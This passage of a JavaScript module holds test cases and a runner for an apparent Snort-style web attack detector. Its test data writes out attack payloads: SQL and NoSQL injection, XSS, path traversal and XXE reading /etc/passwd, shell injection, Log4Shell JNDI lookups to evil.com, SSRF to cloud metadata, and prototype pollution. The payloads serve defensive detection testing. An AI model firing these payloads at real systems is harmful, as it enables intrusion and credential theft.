 *   req         — mock request object
 *   expectMatch — true if at least one rule should fire
 *   expectSID   — optional: specific SID that MUST be in the match list
 *
 * TRUE POSITIVE  (TP) — malicious payload; MUST be detected (expectMatch: true)
 * TRUE NEGATIVE  (TN) — legitimate payload; MUST NOT be detected (expectMatch: false)
 * FALSE POSITIVE (FP) — legitimate-but-suspicious; rule fires but shouldBlock should be false
 */
const TESTS = [

  // ── SQL Injection TPs ─────────────────────────────────────────────────────
  {
    label: "TP: UNION SELECT",
    type: "TP",
    req: { method: "GET", originalUrl: "/search?q=' UNION SELECT 1,2,3--", headers: {}, body: {}, query: { q: "' UNION SELECT 1,2,3--" } },
    expectMatch: true, expectSID: 1000001,
  },
  {
    label: "TP: UNION SELECT URL-encoded",
    type: "TP",
    req: { method: "GET", originalUrl: "/search?q=%27%20UNION%20SELECT%201%2C2%2C3--", headers: {}, body: {}, query: {} },
    expectMatch: true, expectSID: 1000001,
  },
  {
    label: "TP: Boolean blind SQLi",
    type: "TP",
    req: { method: "POST", originalUrl: "/login", headers: { "content-type": "application/x-www-form-urlencoded" }, body: { username: "admin' OR '1'='1" }, query: {} },
    expectMatch: true, expectSID: 1000002,
  },
  {
    label: "TP: Time-based blind SQLi SLEEP",
    type: "TP",
    req: { method: "GET", originalUrl: "/item?id=1' AND SLEEP(5)--", headers: {}, body: {}, query: {} },
    expectMatch: true, expectSID: 1000005,
  },
  {
    label: "TP: DROP TABLE",
    type: "TP",
    req: { method: "POST", originalUrl: "/api/data", headers: {}, body: { q: "'; DROP TABLE users--" }, query: {} },
    expectMatch: true, expectSID: 1000003,
  },
  {
    label: "TP: Stacked query EXEC",
    type: "TP",
    req: { method: "POST", originalUrl: "/api/search", headers: { "content-type": "application/json" }, body: { name: "'; EXEC xp_cmdshell('whoami')--" }, query: {} },
    expectMatch: true, expectSID: 1000006,
  },

  // ── SQL Injection TNs ─────────────────────────────────────────────────────
  {
    label: "TN: Legitimate search with 'or'",
    type: "TN",
    req: { method: "GET", originalUrl: "/search?q=color+or+size", headers: {}, body: {}, query: { q: "color or size" } },
    expectMatch: false,
  },
  {
    label: "TN: JSON API with normal field values",
    type: "TN",
    req: { method: "POST", originalUrl: "/api/users", headers: { "content-type": "application/json" }, body: { username: "alice", role: "admin" }, query: {} },
    expectMatch: false,
  },

  // ── XSS TPs ───────────────────────────────────────────────────────────────
  {
    label: "TP: Script tag injection",
    type: "TP",
    req: { method: "GET", originalUrl: "/page?name=<script>alert(1)</script>", headers: {}, body: {}, query: {} },
    expectMatch: true, expectSID: 1000010,
  },
  {
    label: "TP: XSS URL-encoded script tag",
    type: "TP",
    req: { method: "GET", originalUrl: "/page?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E", headers: {}, body: {}, query: {} },
    expectMatch: true, expectSID: 1000010,
  },
  {
    label: "TP: onerror event handler",
    type: "TP",
    req: { method: "GET", originalUrl: "/img?src=x&alt=<img onerror=alert(1) src=x>", headers: {}, body: {}, query: {} },
    expectMatch: true, expectSID: 1000011,
  },
  {
    label: "TP: javascript: URI in parameter",
    type: "TP",
    req: { method: "GET", originalUrl: "/redirect?url=javascript:alert(1)", headers: {}, body: {}, query: {} },
    expectMatch: true,
  },
  {
    label: "TP: SVG onload XSS",
    type: "TP",
    req: { method: "POST", originalUrl: "/comment", headers: {}, body: { text: "<svg onload=alert(1)>" }, query: {} },
    expectMatch: true, expectSID: 1000013,
  },

  // ── XSS TNs ───────────────────────────────────────────────────────────────
  {
    label: "TN: Normal anchor tag",
    type: "TN",
    req: { method: "GET", originalUrl: "/page?link=<a href='/home'>Home</a>", headers: {}, body: {}, query: {} },
    expectMatch: false,
  },
  {
    label: "TN: React/JSX code snippet in a code editor path",
    type: "TN",
    req: { method: "POST", originalUrl: "/editor/save", headers: { "content-type": "application/json" }, body: { code: "<div onClick={handleClick}>Click</div>" }, query: {} },
    expectMatch: false,
  },

  // ── Path Traversal TPs ────────────────────────────────────────────────────
  {
    label: "TP: Basic path traversal",
    type: "TP",
    req: { method: "GET", originalUrl: "/file?name=../../../etc/passwd", headers: {}, body: {}, query: {} },
    expectMatch: true, expectSID: 1000022,
  },
  {
    label: "TP: URL-encoded traversal",
    type: "TP",
    req: { method: "GET", originalUrl: "/file?name=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow", headers: {}, body: {}, query: {} },
    expectMatch: true, expectSID: 1000021,
  },
  {
    label: "TP: PHP filter wrapper LFI",
    type: "TP",
    req: { method: "GET", originalUrl: "/page?file=php://filter/convert.base64-encode/resource=index.php", headers: {}, body: {}, query: {} },
    expectMatch: true, expectSID: 1000023,
  },
  {
    label: "TP: Sensitive file recon (.env)",
    type: "TP",
    req: { method: "GET", originalUrl: "/.env", headers: {}, body: {}, query: {} },
    expectMatch: true, expectSID: 1000043,
  },

  // ── Path Traversal TNs ────────────────────────────────────────────────────
  {
    label: "TN: Normal relative URL with single dot",
    type: "TN",
    req: { method: "GET", originalUrl: "/files/report.pdf", headers: {}, body: {}, query: {} },
    expectMatch: false,
  },

  // ── RCE TPs ───────────────────────────────────────────────────────────────
  {
    label: "TP: Shell injection via semicolon",
    type: "TP",
    req: { method: "GET", originalUrl: "/ping?host=127.0.0.1;cat /etc/passwd", headers: {}, body: {}, query: {} },
    expectMatch: true, expectSID: 1000034,
  },
  {
    label: "TP: Log4Shell JNDI",
    type: "TP",
    req: { method: "GET", originalUrl: "/", headers: { "user-agent": "${jndi:ldap://evil.com/x}", "host": "example.com" }, body: {}, query: {} },
    expectMatch: true,
  },
  {
    label: "TP: Log4Shell obfuscated",
    type: "TP",
    req: { method: "GET", originalUrl: "/", headers: { "x-forwarded-for": "${${lower:j}ndi:ldap://evil.com/x}", "host": "example.com" }, body: {}, query: {} },
    expectMatch: true,
  },
  {
    label: "TP: SSTI Jinja2 expression",
    type: "TP",
    req: { method: "GET", originalUrl: "/render?template={{7*7}}", headers: {}, body: {}, query: {} },
    expectMatch: true, expectSID: 1000036,
  },

  // ── XXE TPs ───────────────────────────────────────────────────────────────
  {
    label: "TP: XXE DOCTYPE entity",
    type: "TP",
    req: { method: "POST", originalUrl: "/api/xml", headers: { "content-type": "application/xml" }, body: '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>', query: {} },
    expectMatch: true, expectSID: 1000050,
  },

  // ── SSRF TPs ──────────────────────────────────────────────────────────────
  {
    label: "TP: SSRF to AWS metadata",
    type: "TP",
    req: { method: "GET", originalUrl: "/fetch?url=http://169.254.169.254/latest/meta-data/", headers: {}, body: {}, query: {} },
    expectMatch: true, expectSID: 1000060,
  },
  {
    label: "TP: SSRF via gopher scheme",
    type: "TP",
    req: { method: "GET", originalUrl: "/proxy?url=gopher://localhost:6379/_SET%20key%20value", headers: {}, body: {}, query: {} },
    expectMatch: true, expectSID: 1000061,
  },

  // ── NoSQLi TPs ────────────────────────────────────────────────────────────
  {
    label: "TP: MongoDB $ne injection",
    type: "TP",
    req: { method: "POST", originalUrl: "/api/login", headers: { "content-type": "application/json" }, body: { username: "admin", password: { "$ne": null } }, query: {} },
    expectMatch: true, expectSID: 1000080,
  },

  // ── Prototype Pollution TPs ───────────────────────────────────────────────
  {
    label: "TP: Prototype pollution via __proto__",
    type: "TP",
    req: { method: "POST", originalUrl: "/api/merge", headers: {}, body: { "__proto__": { "isAdmin": true } }, query: {} },
    expectMatch: true, expectSID: 1000090,
  },

  // ── Open Redirect TPs ─────────────────────────────────────────────────────
  {
    label: "TP: Open redirect to external domain",
    type: "TP",
    req: { method: "GET", originalUrl: "/logout?redirect=https://evil.com", headers: {}, body: {}, query: {} },
    expectMatch: true, expectSID: 1000070,
  },

  // ── Scanner TPs ───────────────────────────────────────────────────────────
  {
    label: "TP: sqlmap user-agent",
    type: "TP",
    req: { method: "GET", originalUrl: "/", headers: { "user-agent": "sqlmap/1.6.12#stable (https://sqlmap.org)" }, body: {}, query: {} },
    expectMatch: true, expectSID: 1000040,
  },

  // ── False Positive Checks ─────────────────────────────────────────────────
  {
    label: "FP-check: Health endpoint should not block",
    type: "FP",
    req: { method: "GET", originalUrl: "/health", headers: { "user-agent": "UptimeRobot/2.0" }, body: {}, query: {} },
    expectWhitelisted: true,
  },
  {
    label: "FP-check: Internal IP whitelisted",
    type: "FP",
    ip: "10.0.0.5",
    req: { method: "GET", originalUrl: "/", headers: {}, body: {}, query: {} },
    expectWhitelisted: true,
  },
  {
    label: "FP-check: Googlebot whitelisted",
    type: "FP",
    req: { method: "GET", originalUrl: "/", headers: { "user-agent": "Googlebot/2.1 (+http://www.google.com/bot.html)" }, body: {}, query: {} },
    expectWhitelisted: true,
  },
];

/**
 * Run all tests and print a summary report.
 */
function runTests() {
  let passed = 0, failed = 0;
  const failures = [];

  for (const test of TESTS) {
    let ok = true;
    let reason = "";

    if (test.type === "FP" && test.expectWhitelisted !== undefined) {
      const ip = test.ip || "8.8.8.8";
      const wl = isWhitelisted(test.req, ip);
      if (wl !== test.expectWhitelisted) {
        ok = false;
        reason = `Expected isWhitelisted=${test.expectWhitelisted}, got ${wl}`;
      }
    } else {
      const matches = matchSnortRules(test.req);
      const hasMatch = matches.length > 0;

      if (hasMatch !== test.expectMatch) {
        ok = false;
        reason = `Expected match=${test.expectMatch}, got ${hasMatch}. Rules hit: ${getMatchedSIDs(matches) || "none"}`;
      } else if (test.expectSID !== undefined && test.expectMatch) {
        const sidHit = matches.some(m => m.sid === test.expectSID);
        if (!sidHit) {
          ok = false;
          reason = `Expected SID:${test.expectSID} to fire, but matched: ${getMatchedSIDs(matches) || "none"}`;
        }
      }
    }

    if (ok) {
      passed++;
      console.log(`  ✅ [${test.type}] ${test.label}`);
    } else {
      failed++;
      failures.push({ label: test.label, reason });
      console.log(`  ❌ [${test.type}] ${test.label}`);
      console.log(`       → ${reason}`);
    }
  }

  console.log("\n──────────────────────────────────────────");
  console.log(`  Results: ${passed} passed / ${failed} failed / ${TESTS.length} total`);
  if (failed > 0) {
    console.log("\n  Failures:");
    failures.forEach(f => console.log(`  • ${f.label}: ${f.reason}`));
  }
  console.log("──────────────────────────────────────────\n");

  return { passed, failed, total: TESTS.length };
}

// ─────────────────────────────────────────────────────────────────────────────
// EXPORTS
// ─────────────────────────────────────────────────────────────────────────────

module.exports = {
  SNORT_RULES,
  WHITELIST,
  matchSnortRules,
  getBestMatch,
  getMatchedSIDs,
  isWhitelisted,
  falsePositiveScore,
  runTests,        // ← new
  TESTS,           // ← new (for external test runners / Jest)
};
